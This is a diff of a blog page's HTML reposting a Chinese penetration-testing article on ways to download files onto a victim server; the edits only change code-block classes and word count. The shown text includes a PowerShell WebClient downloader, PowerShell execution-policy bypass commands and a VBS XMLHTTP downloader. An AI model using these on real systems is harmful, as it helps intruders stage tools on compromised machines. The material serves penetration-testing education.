@@ -87,7 +87,7 @@ $p =,">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    5.7k
+                    5.8k
                 </span>
                 
                 
@@ -130,31 +130,33 @@ $p =,">
             <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
 <p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
 <h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
-<pre><code class="bash">$p = New-Object System.Net.WebClient
+<pre><code class="cmd">$p = New-Object System.Net.WebClient
 $p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;)
 
 如：$p.DownloadFile(&quot;http://192.168.0.111:3737/test.txt&quot;,&quot;E:text_download.txt&quot;)
 注意：下载的路径如果出现中文字的路径，可能会出错
 </code></pre>
 <p>执行：</p>
-<pre><code class="bash">PS C:&gt; .test.ps1
+<pre><code class="cmd">PS C:&gt; .test.ps1
 </code></pre>
 <p>如果Powershell禁止执行了，使用如下命令：</p>
-<pre><code class="bash">C:&gt;powershell set-executionpolicy unrestricted
+<pre><code class="cmd">C:&gt;powershell set-executionpolicy unrestricted
 </code></pre>
 <p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
 <p>使用如下命令可以查看当前的<code>executionpolicy</code></p>
-<pre><code>E:\&gt;powershell executionpolicy
+<pre><code class="cmd">E:\&gt;powershell executionpolicy
 Restricted
-</code></pre><p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
-<pre><code>E:\&gt;powershell -exec bypass
+</code></pre>
+<p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
+<pre><code class="cmd">E:\&gt;powershell -exec bypass
 Windows PowerShell
 版权所有 (C) 2009 Microsoft Corporation。保留所有权利。
 
 PS E:\&gt; executionpolicy
 Bypass
-</code></pre><h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
-<pre><code class="bash">Set args = Wscript.Arguments
+</code></pre>
+<h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
+<pre><code class="cmd">Set args = Wscript.Arguments
 Url = &quot;http://domain/file&quot;
 dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
 dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
@@ -168,7 +170,7 @@ with bStrm
 end with
 </code></pre>
 <p>执行：</p>
-<pre><code class="bash">C:&gt;cscript test.vbs
+<pre><code class="cmd">C:&gt;cscript test.vbs
 </code></pre>
 <h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
 <pre><code class="bash">#!/usr/bin/perl 
